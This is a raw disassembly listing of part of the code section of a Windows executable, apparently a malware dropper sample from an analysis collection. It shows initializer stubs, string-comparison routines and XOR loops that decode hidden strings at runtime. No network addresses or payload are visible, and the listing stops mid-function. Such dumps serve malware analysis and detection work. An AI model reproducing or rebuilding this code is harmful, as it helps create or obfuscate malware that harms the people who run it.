
malware_samples/dropper/35b908275d6b1b7118580f59439a8f5006aed1078805df067027b4c59968aafc.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	e8 f7 07 00 00       	call   0x140001800
   140001009:	48 8d 0d e0 8b 00 00 	lea    0x8be0(%rip),%rcx        # 0x140009bf0
   140001010:	48 83 c4 28          	add    $0x28,%rsp
   140001014:	e9 6b 7a 00 00       	jmp    0x140008a84
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 83 ec 28          	sub    $0x28,%rsp
   140001024:	e8 47 0c 00 00       	call   0x140001c70
   140001029:	48 8d 0d 40 8c 00 00 	lea    0x8c40(%rip),%rcx        # 0x140009c70
   140001030:	48 83 c4 28          	add    $0x28,%rsp
   140001034:	e9 4b 7a 00 00       	jmp    0x140008a84
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 83 ec 28          	sub    $0x28,%rsp
   140001044:	e8 97 10 00 00       	call   0x1400020e0
   140001049:	48 8d 0d a0 8c 00 00 	lea    0x8ca0(%rip),%rcx        # 0x140009cf0
   140001050:	48 83 c4 28          	add    $0x28,%rsp
   140001054:	e9 2b 7a 00 00       	jmp    0x140008a84
   140001059:	cc                   	int3
   14000105a:	cc                   	int3
   14000105b:	cc                   	int3
   14000105c:	cc                   	int3
   14000105d:	cc                   	int3
   14000105e:	cc                   	int3
   14000105f:	cc                   	int3
   140001060:	48 83 ec 28          	sub    $0x28,%rsp
   140001064:	e8 e7 14 00 00       	call   0x140002550
   140001069:	48 8d 0d 00 8d 00 00 	lea    0x8d00(%rip),%rcx        # 0x140009d70
   140001070:	48 83 c4 28          	add    $0x28,%rsp
   140001074:	e9 0b 7a 00 00       	jmp    0x140008a84
   140001079:	cc                   	int3
   14000107a:	cc                   	int3
   14000107b:	cc                   	int3
   14000107c:	cc                   	int3
   14000107d:	cc                   	int3
   14000107e:	cc                   	int3
   14000107f:	cc                   	int3
   140001080:	48 83 ec 28          	sub    $0x28,%rsp
   140001084:	e8 37 19 00 00       	call   0x1400029c0
   140001089:	48 8d 0d 60 8d 00 00 	lea    0x8d60(%rip),%rcx        # 0x140009df0
   140001090:	48 83 c4 28          	add    $0x28,%rsp
   140001094:	e9 eb 79 00 00       	jmp    0x140008a84
   140001099:	cc                   	int3
   14000109a:	cc                   	int3
   14000109b:	cc                   	int3
   14000109c:	cc                   	int3
   14000109d:	cc                   	int3
   14000109e:	cc                   	int3
   14000109f:	cc                   	int3
   1400010a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010a4:	e8 87 1d 00 00       	call   0x140002e30
   1400010a9:	48 8d 0d c0 8d 00 00 	lea    0x8dc0(%rip),%rcx        # 0x140009e70
   1400010b0:	48 83 c4 28          	add    $0x28,%rsp
   1400010b4:	e9 cb 79 00 00       	jmp    0x140008a84
   1400010b9:	cc                   	int3
   1400010ba:	cc                   	int3
   1400010bb:	cc                   	int3
   1400010bc:	cc                   	int3
   1400010bd:	cc                   	int3
   1400010be:	cc                   	int3
   1400010bf:	cc                   	int3
   1400010c0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010c4:	e8 d7 21 00 00       	call   0x1400032a0
   1400010c9:	48 8d 0d 20 8e 00 00 	lea    0x8e20(%rip),%rcx        # 0x140009ef0
   1400010d0:	48 83 c4 28          	add    $0x28,%rsp
   1400010d4:	e9 ab 79 00 00       	jmp    0x140008a84
   1400010d9:	cc                   	int3
   1400010da:	cc                   	int3
   1400010db:	cc                   	int3
   1400010dc:	cc                   	int3
   1400010dd:	cc                   	int3
   1400010de:	cc                   	int3
   1400010df:	cc                   	int3
   1400010e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010e4:	e8 27 26 00 00       	call   0x140003710
   1400010e9:	48 8d 0d 80 8e 00 00 	lea    0x8e80(%rip),%rcx        # 0x140009f70
   1400010f0:	48 83 c4 28          	add    $0x28,%rsp
   1400010f4:	e9 8b 79 00 00       	jmp    0x140008a84
   1400010f9:	cc                   	int3
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	48 83 ec 28          	sub    $0x28,%rsp
   140001104:	e8 77 2a 00 00       	call   0x140003b80
   140001109:	48 8d 0d e0 8e 00 00 	lea    0x8ee0(%rip),%rcx        # 0x140009ff0
   140001110:	48 83 c4 28          	add    $0x28,%rsp
   140001114:	e9 6b 79 00 00       	jmp    0x140008a84
   140001119:	cc                   	int3
   14000111a:	cc                   	int3
   14000111b:	cc                   	int3
   14000111c:	cc                   	int3
   14000111d:	cc                   	int3
   14000111e:	cc                   	int3
   14000111f:	cc                   	int3
   140001120:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001125:	57                   	push   %rdi
   140001126:	48 83 ec 20          	sub    $0x20,%rsp
   14000112a:	48 8d 3d e7 f3 01 00 	lea    0x1f3e7(%rip),%rdi        # 0x140020518
   140001131:	33 db                	xor    %ebx,%ebx
   140001133:	48 8b cf             	mov    %rdi,%rcx
   140001136:	ba 25 00 00 00       	mov    $0x25,%edx
   14000113b:	e8 20 53 00 00       	call   0x140006460
   140001140:	4c 8d 0d a1 d7 00 00 	lea    0xd7a1(%rip),%r9        # 0x14000e8e8
   140001147:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000114e:	66 90                	xchg   %ax,%ax
   140001150:	48 ff c1             	inc    %rcx
   140001153:	41 38 1c 09          	cmp    %bl,(%r9,%rcx,1)
   140001157:	75 f7                	jne    0x140001150
   140001159:	4c 8d 15 e8 d7 00 00 	lea    0xd7e8(%rip),%r10        # 0x14000e948
   140001160:	48 83 3d c8 f3 01 00 	cmpq   $0xf,0x1f3c8(%rip)        # 0x140020530
   140001167:	0f 
   140001168:	48 8b c3             	mov    %rbx,%rax
   14000116b:	4c 8b c7             	mov    %rdi,%r8
   14000116e:	4c 0f 47 05 a2 f3 01 	cmova  0x1f3a2(%rip),%r8        # 0x140020518
   140001175:	00 
   140001176:	33 d2                	xor    %edx,%edx
   140001178:	48 f7 f1             	div    %rcx
   14000117b:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001180:	42 32 04 13          	xor    (%rbx,%r10,1),%al
   140001184:	41 88 04 18          	mov    %al,(%r8,%rbx,1)
   140001188:	48 ff c3             	inc    %rbx
   14000118b:	48 83 fb 25          	cmp    $0x25,%rbx
   14000118f:	72 cf                	jb     0x140001160
   140001191:	48 8d 0d d8 8e 00 00 	lea    0x8ed8(%rip),%rcx        # 0x14000a070
   140001198:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	e9 dd 78 00 00       	jmp    0x140008a84
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	40 53                	rex push %rbx
   1400011b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011b6:	48 8d 1d 1b f3 01 00 	lea    0x1f31b(%rip),%rbx        # 0x1400204d8
   1400011bd:	ba 08 00 00 00       	mov    $0x8,%edx
   1400011c2:	48 8b cb             	mov    %rbx,%rcx
   1400011c5:	e8 96 52 00 00       	call   0x140006460
   1400011ca:	4c 8d 0d 1f d7 00 00 	lea    0xd71f(%rip),%r9        # 0x14000e8f0
   1400011d1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400011d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400011df:	00 
   1400011e0:	48 ff c1             	inc    %rcx
   1400011e3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400011e8:	75 f6                	jne    0x1400011e0
   1400011ea:	48 83 3d fe f2 01 00 	cmpq   $0xf,0x1f2fe(%rip)        # 0x1400204f0
   1400011f1:	0f 
   1400011f2:	48 8b c3             	mov    %rbx,%rax
   1400011f5:	4c 8b c3             	mov    %rbx,%r8
   1400011f8:	48 0f 47 05 d8 f2 01 	cmova  0x1f2d8(%rip),%rax        # 0x1400204d8
   1400011ff:	00 
   140001200:	c6 00 2d             	movb   $0x2d,(%rax)
   140001203:	b8 01 00 00 00       	mov    $0x1,%eax
   140001208:	48 83 3d e0 f2 01 00 	cmpq   $0xf,0x1f2e0(%rip)        # 0x1400204f0
   14000120f:	0f 
   140001210:	4c 0f 47 05 c0 f2 01 	cmova  0x1f2c0(%rip),%r8        # 0x1400204d8
   140001217:	00 
   140001218:	33 d2                	xor    %edx,%edx
   14000121a:	48 f7 f1             	div    %rcx
   14000121d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001222:	34 37                	xor    $0x37,%al
   140001224:	41 88 40 01          	mov    %al,0x1(%r8)
   140001228:	4c 8b c3             	mov    %rbx,%r8
   14000122b:	48 83 3d bd f2 01 00 	cmpq   $0xf,0x1f2bd(%rip)        # 0x1400204f0
   140001232:	0f 
   140001233:	b8 02 00 00 00       	mov    $0x2,%eax
   140001238:	4c 0f 47 05 98 f2 01 	cmova  0x1f298(%rip),%r8        # 0x1400204d8
   14000123f:	00 
   140001240:	33 d2                	xor    %edx,%edx
   140001242:	48 f7 f1             	div    %rcx
   140001245:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000124a:	34 52                	xor    $0x52,%al
   14000124c:	41 88 40 02          	mov    %al,0x2(%r8)
   140001250:	4c 8b c3             	mov    %rbx,%r8
   140001253:	48 83 3d 95 f2 01 00 	cmpq   $0xf,0x1f295(%rip)        # 0x1400204f0
   14000125a:	0f 
   14000125b:	b8 03 00 00 00       	mov    $0x3,%eax
   140001260:	4c 0f 47 05 70 f2 01 	cmova  0x1f270(%rip),%r8        # 0x1400204d8
   140001267:	00 
   140001268:	33 d2                	xor    %edx,%edx
   14000126a:	48 f7 f1             	div    %rcx
   14000126d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001272:	34 4b                	xor    $0x4b,%al
   140001274:	41 88 40 03          	mov    %al,0x3(%r8)
   140001278:	4c 8b c3             	mov    %rbx,%r8
   14000127b:	48 83 3d 6d f2 01 00 	cmpq   $0xf,0x1f26d(%rip)        # 0x1400204f0
   140001282:	0f 
   140001283:	b8 04 00 00 00       	mov    $0x4,%eax
   140001288:	4c 0f 47 05 48 f2 01 	cmova  0x1f248(%rip),%r8        # 0x1400204d8
   14000128f:	00 
   140001290:	33 d2                	xor    %edx,%edx
   140001292:	48 f7 f1             	div    %rcx
   140001295:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000129a:	34 53                	xor    $0x53,%al
   14000129c:	41 88 40 04          	mov    %al,0x4(%r8)
   1400012a0:	4c 8b c3             	mov    %rbx,%r8
   1400012a3:	48 83 3d 45 f2 01 00 	cmpq   $0xf,0x1f245(%rip)        # 0x1400204f0
   1400012aa:	0f 
   1400012ab:	b8 05 00 00 00       	mov    $0x5,%eax
   1400012b0:	4c 0f 47 05 20 f2 01 	cmova  0x1f220(%rip),%r8        # 0x1400204d8
   1400012b7:	00 
   1400012b8:	33 d2                	xor    %edx,%edx
   1400012ba:	48 f7 f1             	div    %rcx
   1400012bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400012c2:	34 63                	xor    $0x63,%al
   1400012c4:	41 88 40 05          	mov    %al,0x5(%r8)
   1400012c8:	4c 8b c3             	mov    %rbx,%r8
   1400012cb:	48 83 3d 1d f2 01 00 	cmpq   $0xf,0x1f21d(%rip)        # 0x1400204f0
   1400012d2:	0f 
   1400012d3:	b8 06 00 00 00       	mov    $0x6,%eax
   1400012d8:	4c 0f 47 05 f8 f1 01 	cmova  0x1f1f8(%rip),%r8        # 0x1400204d8
   1400012df:	00 
   1400012e0:	33 d2                	xor    %edx,%edx
   1400012e2:	48 f7 f1             	div    %rcx
   1400012e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400012ea:	34 61                	xor    $0x61,%al
   1400012ec:	41 88 40 06          	mov    %al,0x6(%r8)
   1400012f0:	b8 07 00 00 00       	mov    $0x7,%eax
   1400012f5:	48 83 3d f3 f1 01 00 	cmpq   $0xf,0x1f1f3(%rip)        # 0x1400204f0
   1400012fc:	0f 
   1400012fd:	48 0f 47 1d d3 f1 01 	cmova  0x1f1d3(%rip),%rbx        # 0x1400204d8
   140001304:	00 
   140001305:	33 d2                	xor    %edx,%edx
   140001307:	48 f7 f1             	div    %rcx
   14000130a:	48 8d 0d df 8d 00 00 	lea    0x8ddf(%rip),%rcx        # 0x14000a0f0
   140001311:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001316:	34 6e                	xor    $0x6e,%al
   140001318:	88 43 07             	mov    %al,0x7(%rbx)
   14000131b:	48 83 c4 20          	add    $0x20,%rsp
   14000131f:	5b                   	pop    %rbx
   140001320:	e9 5f 77 00 00       	jmp    0x140008a84
   140001325:	cc                   	int3
   140001326:	cc                   	int3
   140001327:	cc                   	int3
   140001328:	cc                   	int3
   140001329:	cc                   	int3
   14000132a:	cc                   	int3
   14000132b:	cc                   	int3
   14000132c:	cc                   	int3
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 83 ec 28          	sub    $0x28,%rsp
   140001334:	e8 b7 2c 00 00       	call   0x140003ff0
   140001339:	48 8d 0d 30 8e 00 00 	lea    0x8e30(%rip),%rcx        # 0x14000a170
   140001340:	48 83 c4 28          	add    $0x28,%rsp
   140001344:	e9 3b 77 00 00       	jmp    0x140008a84
   140001349:	cc                   	int3
   14000134a:	cc                   	int3
   14000134b:	cc                   	int3
   14000134c:	cc                   	int3
   14000134d:	cc                   	int3
   14000134e:	cc                   	int3
   14000134f:	cc                   	int3
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	e8 b7 2e 00 00       	call   0x140004210
   140001359:	48 8d 0d 90 8e 00 00 	lea    0x8e90(%rip),%rcx        # 0x14000a1f0
   140001360:	48 83 c4 28          	add    $0x28,%rsp
   140001364:	e9 1b 77 00 00       	jmp    0x140008a84
   140001369:	cc                   	int3
   14000136a:	cc                   	int3
   14000136b:	cc                   	int3
   14000136c:	cc                   	int3
   14000136d:	cc                   	int3
   14000136e:	cc                   	int3
   14000136f:	cc                   	int3
   140001370:	48 8d 0d f9 8e 00 00 	lea    0x8ef9(%rip),%rcx        # 0x14000a270
   140001377:	e9 08 77 00 00       	jmp    0x140008a84
   14000137c:	48 8d 0d 65 8f 00 00 	lea    0x8f65(%rip),%rcx        # 0x14000a2e8
   140001383:	e9 fc 76 00 00       	jmp    0x140008a84
   140001388:	cc                   	int3
   140001389:	cc                   	int3
   14000138a:	cc                   	int3
   14000138b:	cc                   	int3
   14000138c:	cc                   	int3
   14000138d:	cc                   	int3
   14000138e:	cc                   	int3
   14000138f:	cc                   	int3
   140001390:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001395:	57                   	push   %rdi
   140001396:	48 83 ec 10          	sub    $0x10,%rsp
   14000139a:	48 8b 05 9f 0c 01 00 	mov    0x10c9f(%rip),%rax        # 0x140012040
   1400013a1:	48 33 c4             	xor    %rsp,%rax
   1400013a4:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
   1400013a9:	33 c0                	xor    %eax,%eax
   1400013ab:	4c 8b da             	mov    %rdx,%r11
   1400013ae:	39 05 98 f0 01 00    	cmp    %eax,0x1f098(%rip)        # 0x14002044c
   1400013b4:	48 8b f9             	mov    %rcx,%rdi
   1400013b7:	4c 8b c9             	mov    %rcx,%r9
   1400013ba:	4c 8b d2             	mov    %rdx,%r10
   1400013bd:	74 40                	je     0x1400013ff
   1400013bf:	49 83 f8 10          	cmp    $0x10,%r8
   1400013c3:	72 3a                	jb     0x1400013ff
   1400013c5:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400013ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400013d0:	c4 c1 7e 6f 09       	vmovdqu (%r9),%ymm1
   1400013d5:	c4 c1 75 75 0a       	vpcmpeqw (%r10),%ymm1,%ymm1
   1400013da:	c5 fd d7 d1          	vpmovmskb %ymm1,%edx
   1400013de:	83 fa ff             	cmp    $0xffffffff,%edx
   1400013e1:	0f 85 a9 00 00 00    	jne    0x140001490
   1400013e7:	48 83 c0 10          	add    $0x10,%rax
   1400013eb:	48 83 c1 10          	add    $0x10,%rcx
   1400013ef:	49 83 c1 20          	add    $0x20,%r9
   1400013f3:	49 83 c2 20          	add    $0x20,%r10
   1400013f7:	49 3b c8             	cmp    %r8,%rcx
   1400013fa:	76 d4                	jbe    0x1400013d0
   1400013fc:	c5 f8 77             	vzeroupper
   1400013ff:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001403:	49 3b c8             	cmp    %r8,%rcx
   140001406:	77 38                	ja     0x140001440
   140001408:	bb ff ff 00 00       	mov    $0xffff,%ebx
   14000140d:	0f 1f 00             	nopl   (%rax)
   140001410:	f3 41 0f 6f 09       	movdqu (%r9),%xmm1
   140001415:	f3 41 0f 6f 02       	movdqu (%r10),%xmm0
   14000141a:	66 0f 75 c8          	pcmpeqw %xmm0,%xmm1
   14000141e:	66 0f d7 d1          	pmovmskb %xmm1,%edx
   140001422:	66 3b d3             	cmp    %bx,%dx
   140001425:	0f 85 96 00 00 00    	jne    0x1400014c1
   14000142b:	48 83 c0 08          	add    $0x8,%rax
   14000142f:	48 83 c1 08          	add    $0x8,%rcx
   140001433:	49 83 c1 10          	add    $0x10,%r9
   140001437:	49 83 c2 10          	add    $0x10,%r10
   14000143b:	49 3b c8             	cmp    %r8,%rcx
   14000143e:	76 d0                	jbe    0x140001410
   140001440:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140001444:	49 3b c8             	cmp    %r8,%rcx
   140001447:	0f 87 a8 00 00 00    	ja     0x1400014f5
   14000144d:	4d 8b 09             	mov    (%r9),%r9
   140001450:	49 8b 12             	mov    (%r10),%rdx
   140001453:	4c 3b ca             	cmp    %rdx,%r9
   140001456:	0f 84 96 00 00 00    	je     0x1400014f2
   14000145c:	49 33 d1             	xor    %r9,%rdx
   14000145f:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140001464:	48 0f bc d2          	bsf    %rdx,%rdx
   140001468:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   14000146e:	48 c1 ea 04          	shr    $0x4,%rdx
   140001472:	4c 8d 04 02          	lea    (%rdx,%rax,1),%r8
   140001476:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
   14000147a:	41 0f b7 04 4b       	movzwl (%r11,%rcx,2),%eax
   14000147f:	66 42 39 04 47       	cmp    %ax,(%rdi,%r8,2)
   140001484:	44 0f 42 d3          	cmovb  %ebx,%r10d
   140001488:	41 8b c2             	mov    %r10d,%eax
   14000148b:	e9 89 00 00 00       	jmp    0x140001519
   140001490:	f7 d2                	not    %edx
   140001492:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140001497:	0f bc d2             	bsf    %edx,%edx
   14000149a:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   1400014a0:	48 d1 ea             	shr    $1,%rdx
   1400014a3:	4c 8d 04 02          	lea    (%rdx,%rax,1),%r8
   1400014a7:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
   1400014ab:	41 0f b7 04 4b       	movzwl (%r11,%rcx,2),%eax
   1400014b0:	66 42 39 04 47       	cmp    %ax,(%rdi,%r8,2)
   1400014b5:	44 0f 42 d3          	cmovb  %ebx,%r10d
   1400014b9:	41 8b c2             	mov    %r10d,%eax
   1400014bc:	c5 f8 77             	vzeroupper
   1400014bf:	eb 58                	jmp    0x140001519
   1400014c1:	0f b7 ca             	movzwl %dx,%ecx
   1400014c4:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   1400014c9:	f7 d1                	not    %ecx
   1400014cb:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   1400014d1:	0f bc c9             	bsf    %ecx,%ecx
   1400014d4:	48 d1 e9             	shr    $1,%rcx
   1400014d7:	4c 8d 04 01          	lea    (%rcx,%rax,1),%r8
   1400014db:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   1400014df:	41 0f b7 04 53       	movzwl (%r11,%rdx,2),%eax
   1400014e4:	66 42 39 04 47       	cmp    %ax,(%rdi,%r8,2)
   1400014e9:	44 0f 42 d3          	cmovb  %ebx,%r10d
   1400014ed:	41 8b c2             	mov    %r10d,%eax
   1400014f0:	eb 27                	jmp    0x140001519
   1400014f2:	48 8b c1             	mov    %rcx,%rax
   1400014f5:	49 3b c0             	cmp    %r8,%rax
   1400014f8:	73 1d                	jae    0x140001517
   1400014fa:	48 8d 0c 47          	lea    (%rdi,%rax,2),%rcx
   1400014fe:	4c 2b df             	sub    %rdi,%r11
   140001501:	0f b7 11             	movzwl (%rcx),%edx
   140001504:	66 41 3b 14 0b       	cmp    (%r11,%rcx,1),%dx
   140001509:	75 26                	jne    0x140001531
   14000150b:	48 ff c0             	inc    %rax
   14000150e:	48 83 c1 02          	add    $0x2,%rcx
   140001512:	49 3b c0             	cmp    %r8,%rax
   140001515:	72 ea                	jb     0x140001501
   140001517:	33 c0                	xor    %eax,%eax
   140001519:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   14000151e:	48 33 cc             	xor    %rsp,%rcx
   140001521:	e8 da 72 00 00       	call   0x140008800
   140001526:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000152b:	48 83 c4 10          	add    $0x10,%rsp
   14000152f:	5f                   	pop    %rdi
   140001530:	c3                   	ret
   140001531:	b8 01 00 00 00       	mov    $0x1,%eax
   140001536:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000153b:	0f 42 c3             	cmovb  %ebx,%eax
   14000153e:	eb d9                	jmp    0x140001519
   140001540:	40 53                	rex push %rbx
   140001542:	48 83 ec 20          	sub    $0x20,%rsp
   140001546:	48 8b d9             	mov    %rcx,%rbx
   140001549:	48 8b c2             	mov    %rdx,%rax
   14000154c:	48 8d 0d 05 a0 00 00 	lea    0xa005(%rip),%rcx        # 0x14000b558
   140001553:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001556:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000155a:	48 89 0b             	mov    %rcx,(%rbx)
   14000155d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001561:	0f 11 02             	movups %xmm0,(%rdx)
   140001564:	ff 15 de 9c 00 00    	call   *0x9cde(%rip)        # 0x14000b248
   14000156a:	48 8b c3             	mov    %rbx,%rax
   14000156d:	48 83 c4 20          	add    $0x20,%rsp
   140001571:	5b                   	pop    %rbx
   140001572:	c3                   	ret
   140001573:	cc                   	int3
   140001574:	cc                   	int3
   140001575:	cc                   	int3
   140001576:	cc                   	int3
   140001577:	cc                   	int3
   140001578:	cc                   	int3
   140001579:	cc                   	int3
   14000157a:	cc                   	int3
   14000157b:	cc                   	int3
   14000157c:	cc                   	int3
   14000157d:	cc                   	int3
   14000157e:	cc                   	int3
   14000157f:	cc                   	int3
   140001580:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001584:	48 8d 05 6d d3 00 00 	lea    0xd36d(%rip),%rax        # 0x14000e8f8
   14000158b:	48 85 d2             	test   %rdx,%rdx
   14000158e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001592:	c3                   	ret
   140001593:	cc                   	int3
   140001594:	cc                   	int3
   140001595:	cc                   	int3
   140001596:	cc                   	int3
   140001597:	cc                   	int3
   140001598:	cc                   	int3
   140001599:	cc                   	int3
   14000159a:	cc                   	int3
   14000159b:	cc                   	int3
   14000159c:	cc                   	int3
   14000159d:	cc                   	int3
   14000159e:	cc                   	int3
   14000159f:	cc                   	int3
   1400015a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400015a5:	57                   	push   %rdi
   1400015a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400015aa:	48 8d 05 a7 9f 00 00 	lea    0x9fa7(%rip),%rax        # 0x14000b558
   1400015b1:	48 8b f9             	mov    %rcx,%rdi
   1400015b4:	48 89 01             	mov    %rax,(%rcx)
   1400015b7:	8b da                	mov    %edx,%ebx
   1400015b9:	48 83 c1 08          	add    $0x8,%rcx
   1400015bd:	ff 15 8d 9c 00 00    	call   *0x9c8d(%rip)        # 0x14000b250
   1400015c3:	f6 c3 01             	test   $0x1,%bl
   1400015c6:	74 0d                	je     0x1400015d5
   1400015c8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400015cd:	48 8b cf             	mov    %rdi,%rcx
   1400015d0:	e8 c7 74 00 00       	call   0x140008a9c
   1400015d5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400015da:	48 8b c7             	mov    %rdi,%rax
   1400015dd:	48 83 c4 20          	add    $0x20,%rsp
   1400015e1:	5f                   	pop    %rdi
   1400015e2:	c3                   	ret
   1400015e3:	cc                   	int3
   1400015e4:	cc                   	int3
   1400015e5:	cc                   	int3
   1400015e6:	cc                   	int3
   1400015e7:	cc                   	int3
   1400015e8:	cc                   	int3
   1400015e9:	cc                   	int3
   1400015ea:	cc                   	int3
   1400015eb:	cc                   	int3
   1400015ec:	cc                   	int3
   1400015ed:	cc                   	int3
   1400015ee:	cc                   	int3
   1400015ef:	cc                   	int3
   1400015f0:	48 8d 05 61 9f 00 00 	lea    0x9f61(%rip),%rax        # 0x14000b558
   1400015f7:	48 89 01             	mov    %rax,(%rcx)
   1400015fa:	48 83 c1 08          	add    $0x8,%rcx
   1400015fe:	48 ff 25 4b 9c 00 00 	rex.W jmp *0x9c4b(%rip)        # 0x14000b250
   140001605:	cc                   	int3
   140001606:	cc                   	int3
   140001607:	cc                   	int3
   140001608:	cc                   	int3
   140001609:	cc                   	int3
   14000160a:	cc                   	int3
   14000160b:	cc                   	int3
   14000160c:	cc                   	int3
   14000160d:	cc                   	int3
   14000160e:	cc                   	int3
   14000160f:	cc                   	int3
   140001610:	48 8d 05 f9 d2 00 00 	lea    0xd2f9(%rip),%rax        # 0x14000e910
   140001617:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000161e:	00 
   14000161f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001623:	48 8d 05 6e 9f 00 00 	lea    0x9f6e(%rip),%rax        # 0x14000b598
   14000162a:	48 89 01             	mov    %rax,(%rcx)
   14000162d:	48 8b c1             	mov    %rcx,%rax
   140001630:	c3                   	ret
   140001631:	cc                   	int3
   140001632:	cc                   	int3
   140001633:	cc                   	int3
   140001634:	cc                   	int3
   140001635:	cc                   	int3
   140001636:	cc                   	int3
   140001637:	cc                   	int3
   140001638:	cc                   	int3
   140001639:	cc                   	int3
   14000163a:	cc                   	int3
   14000163b:	cc                   	int3
   14000163c:	cc                   	int3
   14000163d:	cc                   	int3
   14000163e:	cc                   	int3
   14000163f:	cc                   	int3
   140001640:	48 83 ec 48          	sub    $0x48,%rsp
   140001644:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001649:	e8 c2 ff ff ff       	call   0x140001610
   14000164e:	48 8d 15 4b ea 00 00 	lea    0xea4b(%rip),%rdx        # 0x1400100a0
   140001655:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000165a:	e8 14 81 00 00       	call   0x140009773
   14000165f:	cc                   	int3
   140001660:	40 53                	rex push %rbx
   140001662:	48 83 ec 20          	sub    $0x20,%rsp
   140001666:	48 8b d9             	mov    %rcx,%rbx
   140001669:	48 8b c2             	mov    %rdx,%rax
   14000166c:	48 8d 0d e5 9e 00 00 	lea    0x9ee5(%rip),%rcx        # 0x14000b558
   140001673:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001676:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000167a:	48 89 0b             	mov    %rcx,(%rbx)
   14000167d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001681:	0f 11 02             	movups %xmm0,(%rdx)
   140001684:	ff 15 be 9b 00 00    	call   *0x9bbe(%rip)        # 0x14000b248
   14000168a:	48 8d 05 07 9f 00 00 	lea    0x9f07(%rip),%rax        # 0x14000b598
   140001691:	48 89 03             	mov    %rax,(%rbx)
   140001694:	48 8b c3             	mov    %rbx,%rax
   140001697:	48 83 c4 20          	add    $0x20,%rsp
   14000169b:	5b                   	pop    %rbx
   14000169c:	c3                   	ret
   14000169d:	cc                   	int3
   14000169e:	cc                   	int3
   14000169f:	cc                   	int3
   1400016a0:	40 53                	rex push %rbx
   1400016a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400016a6:	48 8b d9             	mov    %rcx,%rbx
   1400016a9:	48 8b c2             	mov    %rdx,%rax
   1400016ac:	48 8d 0d a5 9e 00 00 	lea    0x9ea5(%rip),%rcx        # 0x14000b558
   1400016b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400016b6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400016ba:	48 89 0b             	mov    %rcx,(%rbx)
   1400016bd:	48 8d 48 08          	lea    0x8(%rax),%rcx
